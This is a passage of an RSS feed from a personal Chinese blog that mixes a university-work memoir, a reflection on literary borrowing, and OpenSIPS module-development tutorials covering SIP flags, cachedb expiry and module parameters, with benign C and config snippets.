&lt;p&gt;我也觉得放假回家没意思，决定暑假找工作。因为我有一些photoshop的基础，所以就在招聘网站上写自己精通photoshop，看看有没有人需要。很快我找到了一份工作，然而刚开始的工作并不是图片制作，而是摄影摄像。具体的内容是给古玩艺术品拍照，然后我就一边学习一边拍照，照片拍完还要用ps做后期处理。所以整个暑假，包括大三，和大四。我基本上都在和古玩艺术品打交道，见识了不少的宝贝。从书画，到紫砂壶，玉器，陶器，手工艺品等等，都有接触。上海的各大古玩城，我也基本都跑过好几遍。也组织过一次小型的拍卖会，主要负责拍卖图册的制作。&lt;/p&gt;
&lt;p&gt;我的大三和大四时很忙的，倒不是学习，而是课外的工作。工作很累，每晚基本上都是9点以后下班，回到学校就基本上10点左右。有时候因为太累而在地铁上睡着，结果坐过站了。正好是最后一班地铁，所以只能下了地铁，步行往回走。&lt;/p&gt;
&lt;p&gt;课外的工作很累，但也学到了不少的东西。除此之外，就是自己赚钱能养活自己了。至少大三和大四，我没有再问父母要过生活费。即使是对于父母，要生活费这件事情，也让我觉得不在自在。我是一个向往自由的人，不希望被任何人束缚，即使是父母。&lt;/p&gt;
&lt;p&gt;课外工作的最后阶段，我用自己赚的钱买了人生第一个非常贵的手机iphone6s。我觉得，这是我应得的东西。&lt;/p&gt;
&lt;p&gt;匆匆4年，大学就这么结束了。我对大学并没有什么怀念，只是觉得，我算是蛮幸运的，至少没有白白浪费掉四年的光阴。&lt;/p&gt;</description>
    </item>
    <item>
      <title>ch4-2 flag获取</title>
      <link>https://wdd.js.org/opensips/module-dev/l4-2/</link>
      <pubDate>Sat, 24 Apr 2021 11:26:21 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/module-dev/l4-2/</guid>
      <description>&lt;h1 id=&#34;flag的类型&#34;&gt;flag的类型&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;enum flag_type &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    FLAG_TYPE_MSG&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    FLAG_TYPE_BRANCH,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    FLAG_LIST_COUNT,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;flag实际上是一种二进制的位&#34;&gt;flag实际上是一种二进制的位&lt;/h1&gt;
&lt;p&gt;MAX_FLAG就是一个SIP消息最多可以有多少个flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include &amp;lt;limits.h&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;typedef unsigned int flag_t;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define MAX_FLAG  ((unsigned int)( sizeof(flag_t) * CHAR_BIT - 1 ))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个值更具情况而定，我的机器上是最多32个。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include &amp;lt;limits.h&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;typedef unsigned int flag_t;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define MAX_FLAG  ((unsigned int)( sizeof(flag_t) * CHAR_BIT - 1 ))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;int main&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%zu\n&amp;#34;&lt;/span&gt;, sizeof&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unsigned int&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%u\n&amp;#34;&lt;/span&gt;, CHAR_BIT&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%u\n&amp;#34;&lt;/span&gt;, MAX_FLAG&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$gcc -o main *.c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;由字符串获取flag&#34;&gt;由字符串获取flag&lt;/h1&gt;
&lt;p&gt;opensips 1.0时，flag都是整数，2.0才引入了字符串。&lt;/p&gt;</description>
    </item>
    <item>
      <title>关于中科院回信文字的联想</title>
      <link>https://wdd.js.org/posts/2021/04/dttcg5/</link>
      <pubDate>Wed, 21 Apr 2021 20:38:45 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/dttcg5/</guid>
      <description>&lt;p&gt;最近看到澎湃新闻报道了一个博士论文的致谢部分，内容如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;走了很远的路，吃了很多的苦，才将这份博士学位论文送到你的面前。二十二载求学路，一路风雨泥泞，许多不容易。如梦一场，仿佛昨天一家人才团聚过。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;看到这个句子，我瞬间觉得一种似曾相识之感。&lt;/p&gt;
&lt;p&gt;我记得我也曾写过类似的句子。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我花了很长的时间，走过了人生的大半个青葱岁月的花样年华
才学会什么是效率，什么是专一。
蓦然回首
10年的路，每次转变的开始都是感觉镣铐加身，步履维艰，屡次三番想要放弃&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/wangdd/blog/xyh6lg?view=doc_embed&#34;&gt;生命不息 折腾不止 使用ubuntu作为主力开发工具&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其实，这种句子也不是我的原创。是我仿照我看过的一本小说，从中摘抄而来。&lt;/p&gt;
&lt;p&gt;这本小说叫做《项塔兰》&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我花了很长的岁月，走过大半个世界，才真正学到什么是爱、什么是命运，以及我们所做的抉择。我被拴在墙上遭受拷打时，才顿悟这个真谛。不知为何，就在我内心发出呐喊之际，我意识到，即使镣铐加身，一身血污，孤立无助，我仍然是自由之身，我可以决定是要痛恨拷打我的人，还是原谅他们。我知道，这听起来似乎算不了什么，但在镣铐加身、痛苦万分的当下，当镣铐是你唯一仅有的，那份自由将带给你无限的希望。是要痛恨，还是要原谅，这抉择足以决定人一生的际遇。《项塔兰》&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这是一名通缉犯的十年印度流亡岁月的记录，很难想象，一名在逃犯是如何写出如此优秀的文笔。各位看官有时间可以看看。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/9kfGCXevO5Hlpg_iINof6Q&#34;&gt;https://mp.weixin.qq.com/s/9kfGCXevO5Hlpg_iINof6Q&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>cachedb的相关问题</title>
      <link>https://wdd.js.org/opensips/ch6/cachedb/</link>
      <pubDate>Wed, 21 Apr 2021 18:08:05 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch6/cachedb/</guid>
      <description>&lt;h1 id=&#34;底层可用&#34;&gt;底层可用&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;local 缓存存在本地，速度快，但是多实例无法共享，重启后消失&lt;/li&gt;
&lt;li&gt;redis 缓存存在redis, 多实例可以共享，重启后不消失&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;接口&#34;&gt;接口&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;store -&lt;a href=&#34;https://www.opensips.org/Documentation/Script-CoreFunctions#toc101&#34;&gt;cache_store()&lt;/a&gt; 存储&lt;/li&gt;
&lt;li&gt;fetch -&lt;a href=&#34;https://www.opensips.org/Documentation/Script-CoreFunctions#toc102&#34;&gt;cache_fetch()&lt;/a&gt; 获取&lt;/li&gt;
&lt;li&gt;remove -&lt;a href=&#34;https://www.opensips.org/Documentation/Script-CoreFunctions#toc103&#34;&gt;cache_remove()&lt;/a&gt; 删除&lt;/li&gt;
&lt;li&gt;add -&lt;a href=&#34;https://www.opensips.org/Documentation/Script-CoreFunctions#toc104&#34;&gt;cache_add()&lt;/a&gt; 递增&lt;/li&gt;
&lt;li&gt;sub -&lt;a href=&#34;https://www.opensips.org/Documentation/Script-CoreFunctions#toc105&#34;&gt;cache_sub()&lt;/a&gt; 递减&lt;/li&gt;
&lt;li&gt;cache_counter_fetch 获取某个key的值&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;关于过期的单位&#34;&gt;关于过期的单位&lt;/h1&gt;
&lt;p&gt;虽然文档上没有明说，但是过期的单位都是秒。&lt;/p&gt;
&lt;h1 id=&#34;cachedb_local过期&#34;&gt;cachedb_local过期&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cachedb_local.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cachedb_local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cachedb_url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local://&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cachedb_local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cache_clean_period&amp;#34;&lt;/span&gt;, 600&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;xxx&lt;span style=&#34;color:#f92672&#34;&gt;]{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		cache_add&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$fu&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, 100, 5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;假如说：在5秒之内，同一个$fu来了多个请求，在设置这个$fu值的时候，计时器是不会重置的。过期的计时器还是第一次的设置的那个时间点开始计时。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.opensips.org/Documentation/Tutorials-KeyValueInterface&#34;&gt;https://www.opensips.org/Documentation/Tutorials-KeyValueInterface&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>ch4-1 USE_FUNC_PARAM参数类型</title>
      <link>https://wdd.js.org/opensips/module-dev/l4-1/</link>
      <pubDate>Wed, 21 Apr 2021 14:02:28 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/module-dev/l4-1/</guid>
      <description>&lt;p&gt;模块传参有两种类型&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;直接赋值传参&lt;/li&gt;
&lt;li&gt;间接函数调用传参&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;str local_zone_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,0&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;int some_int_param &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;static param_export_t params&lt;span style=&#34;color:#f92672&#34;&gt;[]={&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	// 直接字符串赋值
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local_zone_code&amp;#34;&lt;/span&gt;, STR_PARAM,  &amp;amp;local_zone_code.s&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  // 直接整数赋值
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;some_int_param&amp;#34;&lt;/span&gt;, INT_PARAM,  &amp;amp;some_int_param&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  // 函数调用 字符窜
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zone_code_map&amp;#34;&lt;/span&gt;, STR_PARAM|USE_FUNC_PARAM,  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;void *&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;amp;set_code_zone_map&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  // 函数调用 整数
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zone_code_map_int&amp;#34;&lt;/span&gt;, INT_PARAM|USE_FUNC_PARAM,  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;void *&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&amp;amp;set_code_zone_map_int&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;0,0,0&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用函数处理参数的好处是，可以对参数做更复杂的处理。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;某个参数可以多次传递&lt;/li&gt;
&lt;li&gt;对参数进行校验，在启动前就可以判断传参是否有问题。&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;static int set_code_zone_map&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unsigned int type, void *val&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     LM_INFO&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;set_zone_code_map type:%d val:%s \n&amp;#34;&lt;/span&gt;,type,&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;char *&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;val&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; 1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>ch1 开发课程简介</title>
      <link>https://wdd.js.org/opensips/module-dev/l1/</link>
      <pubDate>Wed, 21 Apr 2021 13:52:43 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/module-dev/l1/</guid>
      <description>&lt;p&gt;本章节，带领大家探索opensips模块开发。希望深入了解opensips的同学可以看看。&lt;/p&gt;
&lt;h1 id=&#34;内容涵盖&#34;&gt;内容涵盖&lt;/h1&gt;
&lt;p&gt;章节的内容将会涵盖&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; opensips的启动流程&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何创建一个模块&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何给模块传递参数&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 模块的生命周期函数的处理&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何暴露自定义的函数&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何检查函数的传惨&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何获取$var或者$avp变量&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何获取相关的flag&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何修改SIP消息&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何编写mi接口&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何编写statistics统计数据&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 如何做数据库操作&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;opensips架构&#34;&gt;OpenSIPS架构&lt;/h1&gt;
&lt;p&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2021/png/280451/1619052805992-8c664063-f4a6-4d58-bf62-b4ed76e31efd.png#clientId=ua35bbf88-879f-4&amp;from=paste&amp;height=753&amp;id=u07809075&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=753&amp;originWidth=1184&amp;originalType=binary&amp;size=685927&amp;status=done&amp;style=none&amp;taskId=u5885c0dd-1c86-47f3-9f5a-f9a0d23ec26&amp;width=1184&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://voipmagazine.files.wordpress.com/2014/09/opensips-arch.jpg&#34;&gt;https://voipmagazine.files.wordpress.com/2014/09/opensips-arch.jpg&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>ch4 配置模块的启动参数</title>
      <link>https://wdd.js.org/opensips/module-dev/l4/</link>
      <pubDate>Wed, 21 Apr 2021 09:03:00 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/module-dev/l4/</guid>
      <description>&lt;h1 id=&#34;开始&#34;&gt;开始&lt;/h1&gt;
&lt;p&gt;我们需要给home_location模块增加一个参数，配置当地的号码区号&lt;/p&gt;
&lt;p&gt;首先，我们删除maxfwd.c文件中开头的很多注释，我们先把注意力集中在代码上。&lt;/p&gt;
&lt;p&gt;删除了30多行注释，代码还剩160多行。&lt;/p&gt;
&lt;p&gt;首先我们一个变量，用来保存本地的区号。这个变量是个str类型。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;str local_zone_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,0&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;str&#34;&gt;str&lt;/h2&gt;
&lt;p&gt;关于str类型，可以参考opensips/str.h头文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;struct __str &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	char* s; /**&amp;lt; string as char array */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	int len; /**&amp;lt; string length, not including null-termination */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;typedef struct __str str;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;实际上，str是个指向__str结构体，可以看出这个结构体有指向字符串的char*类型的指针，以及一个代表字符串长度的len属性。这样做的好处是可以高效的获取字符串的长度，很多有名的开源项目都有类似的结构体。&lt;/p&gt;
&lt;p&gt;opensips几乎所有的字符串都是用的str类型&lt;/p&gt;
